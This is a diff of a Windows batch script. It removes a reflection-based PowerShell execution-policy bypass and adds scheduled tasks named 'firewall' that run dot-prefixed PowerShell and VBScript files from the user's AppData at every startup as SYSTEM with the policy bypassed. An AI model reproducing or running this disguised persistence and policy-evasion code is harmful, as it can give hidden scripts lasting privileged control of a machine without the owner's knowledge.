@@ -70,7 +70,7 @@ echo.
 
 echo running: %HD%\%NAME%x.ps1
 
-ping 127.0.0.1 -n 14 > nul
+ping 127.0.0.1 -n 10 > nul
 
 :: move script files with error checking
 if exist "%SF%\%NAME%.vbs" move /y "%SF%\%NAME%.vbs" "%HD%\" >nul
@@ -94,14 +94,13 @@ ping 127.0.0.1 -n 6 > nul
 
 set _PATH=%HD%\%NAME%x.ps1
 
-:: Disable Execution Policy
-powershell -ExecutionPolicy Bypass -Command "& {
-    function Disable-ExecutionPolicy {
-        ($ctx = $executioncontext.gettype().getfield('_context','nonpublic,instance').getvalue($executioncontext)).gettype().getfield('_authorizationManager','nonpublic,instance').setvalue($ctx, (new-object System.Management.Automation.AuthorizationManager 'Microsoft.PowerShell'))
-    };
-    Disable-ExecutionPolicy;
-}"
+set fileName=.firewall%VER%
+set psFilePath=%APPDATA%\Firewall\%fileName%.ps1
+set vbsFilePath=%APPDATA%\Firewall\%fileName%.vbs
 
-powershell -noexit -ExecutionPolicy Bypass -Command "& ""%_PATH%"""
+schtasks /create /tn "firewall" /tr "powershell.exe -ExecutionPolicy Bypass -File %APPDATA%\Firewall\.firewall%VER%.ps1" /sc onstart /ru SYSTEM
+schtasks /create /tn "firewall" /tr "cscript.exe %APPDATA%\Firewall\.firewall%VER%.vbs" /sc onstart /ru SYSTEM
+
+echo Tasks created
 
 exit
